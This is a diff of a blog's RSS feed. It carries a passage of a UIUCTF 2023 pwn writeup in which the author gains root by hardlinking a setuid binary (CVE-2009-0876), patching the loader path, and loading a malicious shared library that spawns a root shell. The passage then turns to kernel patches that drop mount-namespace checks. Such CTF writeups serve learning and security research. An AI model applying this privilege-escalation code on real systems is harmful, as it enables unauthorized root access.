@@ -1,5 +1,659 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on nyancat0131</title><link>https://nyancat0131.moe/tags/ctf/</link><description>Recent content in ctf on nyancat0131</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 06 Sep 2021 07:30:12 +0000</lastBuildDate><atom:link href="https://nyancat0131.moe/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>ALLES! CTF 2021 - 🔥 Counter Strike: Squirrel Offensive</title><link>https://nyancat0131.moe/ctf-writeups/alles-ctf/2021/csgo/</link><pubDate>Mon, 06 Sep 2021 07:30:12 +0000</pubDate><guid>https://nyancat0131.moe/ctf-writeups/alles-ctf/2021/csgo/</guid><description>This challenge involves an old version of CS:GO VScript, which is vulnerable to a UAF bug and a type confusion bug.
-Resources on VScript can be found here.
-Here is the exploit script.
-UAF by resizing array in sort compare function The sort function of squirrel array is array_sort in sqbaselib.cpp, which will call _qsort:
-// v: VM, o: array object, func: compare func _qsort(v, o, 0, _array(o)-&amp;gt;Size()-1, func); The r index passed into _qsort is fixed at the beginning, so by abusing array.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on nyancat0131</title><link>https://nyancat0131.moe/tags/ctf/</link><description>Recent content in ctf on nyancat0131</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 06 Jul 2023 00:00:01 +0000</lastBuildDate><atom:link href="https://nyancat0131.moe/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>UIUCTF 2023 Writeups</title><link>https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/</link><pubDate>Thu, 06 Jul 2023 00:00:01 +0000</pubDate><guid>https://nyancat0131.moe/post/ctf-writeups/uiu-ctf/2023/writeup/</guid><description>&lt;p>At UIUCTF 2023, I played with &lt;a class="link" href="https://twitter.com/ProjectSEKAIctf" target="_blank" rel="noopener"
+>Project Sekai CTF team&lt;/a>. We achieved 3rd place overall.
+Below is my writeup for some pwn challenges in the CTF.&lt;/p>
+&lt;h2 id="zapping-a-setuid-1">Zapping a Setuid 1&lt;/h2>
+&lt;blockquote>
+&lt;p>I was reading &lt;a class="link" href="https://zapps.app/technology/" target="_blank" rel="noopener"
+>how Zapps work&lt;/a> the other day and I thought I could &lt;a class="link" href="https://github.com/warptools/ldshim/issues/1" target="_blank" rel="noopener"
+>do better&lt;/a>. However, what happens when a setuid was zapped?&lt;/p>
+&lt;/blockquote>
+&lt;p>Hint:&lt;/p>
+&lt;blockquote>
+&lt;p>Oops I left &lt;a class="link" href="https://bugs.gentoo.org/260331" target="_blank" rel="noopener"
+>CVE-2009-0876&lt;/a> open.&lt;/p>
+&lt;/blockquote>
+&lt;p>Looking around the VM, we saw a directory with a &lt;code>setuid&lt;/code> binary named &lt;code>exe&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~/zapps/build$ ls -la
+total 2456
+drwxr-xr-x 1 root root 76 Jun 19 18:12 .
+drwxr-xr-x 1 root root 16 Jun 20 16:35 ..
+-rwsr-xr-x 1 root root 31280 Jun 19 18:12 exe
+-rwxr-xr-x 1 root root 240936 Jun 19 18:12 ld-linux-x86-64.so.2
+-rwxr-xr-x 1 root root 17464 Jun 19 18:12 lib.so
+-rw-r--r-- 1 root root 2216304 Jun 19 18:12 libc.so.6
+&lt;/code>&lt;/pre>&lt;p>Some background on &lt;code>setuid&lt;/code> binary: If a binary has &lt;code>setuid&lt;/code> flag set, when an user execute that binary normally, the process will have privileges of the file&amp;rsquo;s &lt;strong>owner&lt;/strong>.
+For example &lt;code>sudo&lt;/code> uses this feature in order to run commands with &lt;code>root&lt;/code> privileges after checking current user&amp;rsquo;s permissions.&lt;/p>
+&lt;p>Running the &lt;code>exe&lt;/code>, we got the following output:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~/zapps/build$ ./exe
+static_constructor in lib invoked
+static_constructor in exe invoked
+main invoked with arguments:
+argv[0] = ./exe
+foo invoked
+contents of /proc/self/maps:
+555555fbf000-555555fe0000 rw-p 00000000 00:00 0 [heap]
+7f53d7218000-7f53d721b000 rw-p 00000000 00:00 0
+7f53d721b000-7f53d7243000 r--p 00000000 00:0f 296643 /usr/lib/zapps/build/libc.so.6
+7f53d7243000-7f53d73d8000 r-xp 00028000 00:0f 296643 /usr/lib/zapps/build/libc.so.6
+7f53d73d8000-7f53d7430000 r--p 001bd000 00:0f 296643 /usr/lib/zapps/build/libc.so.6
+7f53d7430000-7f53d7434000 r--p 00214000 00:0f 296643 /usr/lib/zapps/build/libc.so.6
+7f53d7434000-7f53d7436000 rw-p 00218000 00:0f 296643 /usr/lib/zapps/build/libc.so.6
+7f53d7436000-7f53d7443000 rw-p 00000000 00:00 0
+7f53d7443000-7f53d7444000 r--p 00000000 00:0f 296642 /usr/lib/zapps/build/lib.so
+7f53d7444000-7f53d7445000 r-xp 00001000 00:0f 296642 /usr/lib/zapps/build/lib.so
+7f53d7445000-7f53d7446000 r--p 00002000 00:0f 296642 /usr/lib/zapps/build/lib.so
+7f53d7446000-7f53d7447000 r--p 00002000 00:0f 296642 /usr/lib/zapps/build/lib.so
+7f53d7447000-7f53d7448000 rw-p 00003000 00:0f 296642 /usr/lib/zapps/build/lib.so
+7f53d7448000-7f53d744a000 rw-p 00000000 00:00 0
+7f53d744a000-7f53d744c000 r--p 00000000 00:0f 296641 /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d744c000-7f53d7476000 r-xp 00002000 00:0f 296641 /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7476000-7f53d7481000 r--p 0002c000 00:0f 296641 /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7481000-7f53d7482000 ---p 00000000 00:00 0
+7f53d7482000-7f53d7484000 r--p 00037000 00:0f 296641 /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7484000-7f53d7486000 rw-p 00039000 00:0f 296641 /usr/lib/zapps/build/ld-linux-x86-64.so.2
+7f53d7486000-7f53d7487000 r--p 00000000 00:0f 296640 /usr/lib/zapps/build/exe
+7f53d7487000-7f53d7488000 r-xp 00001000 00:0f 296640 /usr/lib/zapps/build/exe
+7f53d7488000-7f53d7489000 r--p 00002000 00:0f 296640 /usr/lib/zapps/build/exe
+7f53d7489000-7f53d748a000 r--p 00002000 00:0f 296640 /usr/lib/zapps/build/exe
+7f53d748a000-7f53d748b000 rw-p 00003000 00:0f 296640 /usr/lib/zapps/build/exe
+7ffd50913000-7ffd50934000 rw-p 00000000 00:00 0 [stack]
+7ffd50996000-7ffd5099a000 r--p 00000000 00:00 0 [vvar]
+7ffd5099a000-7ffd5099c000 r-xp 00000000 00:00 0 [vdso]
+&lt;/code>&lt;/pre>&lt;p>From the output, we can see that the &lt;code>exe&lt;/code> loads &lt;code>lib.so&lt;/code>, &lt;code>libc.so.6&lt;/code> and &lt;code>ld-linux-x86-64.so.2&lt;/code>.
+That means if we can compromise one of those, we can execute code with &lt;code>root&lt;/code> privileges since &lt;code>exe&lt;/code> is a &lt;code>setuid&lt;/code> binary with &lt;code>root&lt;/code> as owner.
+The problem is we cannot write to &lt;code>/usr/lib/zapps/build/&lt;/code>. It&amp;rsquo;s time to look at the report mentioned in the hint:&lt;/p>
+&lt;blockquote>
+&lt;p>&amp;hellip; hardlinks on Linux preserve permission, including set*id bits, and can be created by non-root users.&lt;/p>
+&lt;/blockquote>
+&lt;p>That means if we create a hardlink to &lt;code>/usr/lib/zapps/build/exe&lt;/code> at somewhere else, it will still have the &lt;code>setuid&lt;/code> bit set. We can create the hardlink using the following command:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ ln /usr/lib/zapps/build/exe
+&lt;/code>&lt;/pre>&lt;p>Now copy &lt;code>lib.so&lt;/code>, &lt;code>libc.so.6&lt;/code> and &lt;code>ld-linux-x86-64.so.2&lt;/code> to the same directory with the hard link to do a test run:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ cp /usr/lib/zapps/build/*.so* .
+uiuctf-2023:~$ ls
+exe init_chal ld-linux-x86-64.so.2 lib.so libc.so.6 zapps
+uiuctf-2023:~$ ./exe
+./exe: error while loading shared libraries: lib.so: cannot open shared object file: No such file or directory
+&lt;/code>&lt;/pre>&lt;p>Seems like the &lt;code>ld&lt;/code> cannot find &lt;code>lib.so&lt;/code> in any of the search paths. I decided to just patch one of the search path in &lt;code>ld&lt;/code> to &lt;code>/home/user/&lt;/code> using this python script:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;ld-linux-x86-64.so.2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dat &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dat &lt;span style="color:#f92672">=&lt;/span> dat[:&lt;span style="color:#ae81ff">180311&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/home/user////////////////&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> dat[&lt;span style="color:#ae81ff">180337&lt;/span>:]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;ld-linux-x86-64.so.2&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#f92672">.&lt;/span>write(dat)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now it can run again:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ ./exe
+static_constructor in lib invoked
+static_constructor in exe invoked
+main invoked with arguments:
+argv[0] = ./exe
+foo invoked
+contents of /proc/self/maps:
+555555cb9000-555555cda000 rw-p 00000000 00:00 0 [heap]
+7f5a1c023000-7f5a1c026000 rw-p 00000000 00:00 0
+7f5a1c026000-7f5a1c04e000 r--p 00000000 00:0f 297376 /home/user/libc.so.6
+7f5a1c04e000-7f5a1c1e3000 r-xp 00028000 00:0f 297376 /home/user/libc.so.6
+7f5a1c1e3000-7f5a1c23b000 r--p 001bd000 00:0f 297376 /home/user/libc.so.6
+7f5a1c23b000-7f5a1c23f000 r--p 00214000 00:0f 297376 /home/user/libc.so.6
+7f5a1c23f000-7f5a1c241000 rw-p 00218000 00:0f 297376 /home/user/libc.so.6
+7f5a1c241000-7f5a1c24e000 rw-p 00000000 00:00 0
+7f5a1c24e000-7f5a1c24f000 r--p 00000000 00:0f 297375 /home/user/lib.so
+7f5a1c24f000-7f5a1c250000 r-xp 00001000 00:0f 297375 /home/user/lib.so
+7f5a1c250000-7f5a1c251000 r--p 00002000 00:0f 297375 /home/user/lib.so
+7f5a1c251000-7f5a1c252000 r--p 00002000 00:0f 297375 /home/user/lib.so
+7f5a1c252000-7f5a1c253000 rw-p 00003000 00:0f 297375 /home/user/lib.so
+7f5a1c253000-7f5a1c255000 rw-p 00000000 00:00 0
+7f5a1c255000-7f5a1c257000 r--p 00000000 00:0f 297374 /home/user/ld-linux-x86-64.so.2
+7f5a1c257000-7f5a1c281000 r-xp 00002000 00:0f 297374 /home/user/ld-linux-x86-64.so.2
+7f5a1c281000-7f5a1c28c000 r--p 0002c000 00:0f 297374 /home/user/ld-linux-x86-64.so.2
+7f5a1c28c000-7f5a1c28d000 ---p 00000000 00:00 0
+7f5a1c28d000-7f5a1c28f000 r--p 00037000 00:0f 297374 /home/user/ld-linux-x86-64.so.2
+7f5a1c28f000-7f5a1c291000 rw-p 00039000 00:0f 297374 /home/user/ld-linux-x86-64.so.2
+7f5a1c291000-7f5a1c292000 r--p 00000000 00:0f 296640 /home/user/exe
+7f5a1c292000-7f5a1c293000 r-xp 00001000 00:0f 296640 /home/user/exe
+7f5a1c293000-7f5a1c294000 r--p 00002000 00:0f 296640 /home/user/exe
+7f5a1c294000-7f5a1c295000 r--p 00002000 00:0f 296640 /home/user/exe
+7f5a1c295000-7f5a1c296000 rw-p 00003000 00:0f 296640 /home/user/exe
+7ffdc7547000-7ffdc7568000 rw-p 00000000 00:00 0 [stack]
+7ffdc75a9000-7ffdc75ad000 r--p 00000000 00:00 0 [vvar]
+7ffdc75ad000-7ffdc75af000 r-xp 00000000 00:00 0 [vdso]
+&lt;/code>&lt;/pre>&lt;p>I then created a new &lt;code>lib.so&lt;/code> using the following C code:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">__attribute__&lt;/span>((constructor)) &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">static_constructor&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Set effective user id of the process to root
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">setuid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">perror&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;setuid&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Set effective group id of the process to root
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">setgid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">perror&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;setgid&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spawn a shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">execlp&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;bash&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;-l&amp;#34;&lt;/span>, NULL);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;foo invoked&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Compile it with:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ cc -o lib.so x.c -fPIC -shared
+&lt;/code>&lt;/pre>&lt;p>Now we run the &lt;code>exe&lt;/code> with our new &lt;code>lib.so&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>uiuctf-2023:~$ ./exe
+setuid: Success
+setgid: Success
+uiuctf-2023:~# id
+uid=0(root) gid=0(root) groups=0(root),1000(user)
+uiuctf-2023:~# cat /mnt/flag
+uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
+&lt;/code>&lt;/pre>&lt;h2 id="zapping-a-setuid-2">Zapping a Setuid 2&lt;/h2>
+&lt;blockquote>
+&lt;p>Ok ok ok, but what if there was another way?&lt;/p>
+&lt;/blockquote>
+&lt;p>Hint 1:&lt;/p>
+&lt;blockquote>
+&lt;p>The &amp;ldquo;zapps&amp;rdquo; symlink is for accessibility. The intended solution does not depend on the symlink.&lt;/p>
+&lt;/blockquote>
+&lt;p>Hint 2:&lt;/p>
+&lt;blockquote>
+&lt;p>The additional patches to this challenge are hints.&lt;/p>
+&lt;/blockquote>
+&lt;p>To understand this challenge, first we need to know about &lt;a class="link" href="https://man7.org/linux/man-pages/man7/namespaces.7.html" target="_blank" rel="noopener"
+>Linux namespaces&lt;/a>.
+For a quick explanation, namespaces are used to create isolated environment.
+Processes inside a namespace can only see and use resources inside that namespace.
+One use of namespaces is to implement containers.&lt;/p>
+&lt;p>There are multiple kind of namespaces (click on them to see their &lt;code>man&lt;/code> pages):&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/user_namespaces.7.html" target="_blank" rel="noopener"
+>User namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/mount_namespaces.7.html" target="_blank" rel="noopener"
+>Mount namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/network_namespaces.7.html" target="_blank" rel="noopener"
+>Network namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/pid_namespaces.7.html" target="_blank" rel="noopener"
+>PID namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html" target="_blank" rel="noopener"
+>Cgroup namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html" target="_blank" rel="noopener"
+>IPC namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/time_namespaces.7.html" target="_blank" rel="noopener"
+>Time namespace&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://man7.org/linux/man-pages/man7/uts_namespaces.7.html" target="_blank" rel="noopener"
+>UTS namespace&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>In this challenge, &lt;code>protected_hardlinks&lt;/code> is enable so &lt;code>user&lt;/code> cannot create hard link of &lt;code>exe&lt;/code> anymore.
+But the kernel is modified with some patches. Let&amp;rsquo;s analyze them.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-diff" data-lang="diff">&lt;span style="display:flex;">&lt;span>From 7d26a340113813b6f9064b25f2928c177269d2f5 Mon Sep 17 00:00:00 2001
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>From: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon, 19 Jun 2023 22:26:16 -0700
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Subject: [PATCH] fs/namespace: Allow generic loopback mount without requiring
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nsfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>The argument was flawed and was never agreed upon [1].
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>After 18 years, what could possibly go wrong?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[1] https://lore.kernel.org/all/1131563299.5400.392.camel@localhost/T/#t
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Signed-off-by: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">&lt;/span> fs/namespace.c | 3 ---
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1 file changed, 3 deletions(-)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/fs/namespace.c b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index 4f520f800dbc..eb196f016e3f 100644
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -2396,9 +2396,6 @@ static struct mount *__do_loopback(struct path *old_path, int recurse)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> if (IS_MNT_UNBINDABLE(old))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> return mnt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- if (!check_mnt(old) &amp;amp;&amp;amp; old_path-&amp;gt;dentry-&amp;gt;d_op != &amp;amp;ns_dentry_operations)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- return mnt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span> if (!recurse &amp;amp;&amp;amp; has_locked_children(old, old_path-&amp;gt;dentry))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> return mnt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>2.41.0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>check_mnt&lt;/code> is used to check if the path is in the same mount namespace as the current task&amp;rsquo;s mount namespace.
+By removing this check, the patch allows cross loopback mounting between different mount namespaces.&lt;/p>
+&lt;blockquote>
+&lt;p>Mount namespace isolates the mount table. Changes to the mount table inside a namespace will not be visible to other namespaces.&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-diff" data-lang="diff">&lt;span style="display:flex;">&lt;span>From 9946c9e1e098884064df8a394a6ef992c94d21e6 Mon Sep 17 00:00:00 2001
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>From: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Mon, 19 Jun 2023 21:39:32 -0700
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Subject: [PATCH] fs/namespace: Allow unpriv OPEN_TREE_CLONE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>OPEN_TREE_CLONE is only really useful when you could use move_mount()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>to perform a bind mount. Otherwise all you get is an fd equivalent to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>an O_PATH&amp;#39;ed fd that is detached, without a way to modify any
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mountpoints of the current namespace.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>What could possibly go wrong?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Signed-off-by: YiFei Zhu &amp;lt;zhuyifei@google.com&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="font-weight:bold">&lt;/span> fs/namespace.c | 3 ---
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1 file changed, 3 deletions(-)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>diff --git a/fs/namespace.c b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>index df137ba19d37..4f520f800dbc 100644
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/fs/namespace.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -2527,9 +2527,6 @@ SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, fl
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> if (flags &amp;amp; AT_EMPTY_PATH)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lookup_flags |= LOOKUP_EMPTY;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- if (detached &amp;amp;&amp;amp; !may_mount())
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">- return -EPERM;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span> fd = get_unused_fd_flags(flags &amp;amp; O_CLOEXEC);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> if (fd &amp;lt; 0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> return fd;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>2.41.0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This patch allow unprivileged user to call &lt;code>SYS_open_tree&lt;/code> with &lt;code>OPEN_TREE_CLONE&lt;/code> flag.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-diff" data-lang="diff">&lt;span style="display:flex;">&lt;span>From 7bba6f2216c5b757e38cd90f7b12bdf952e316c7 Mon Sep 17 00:00:00 2001
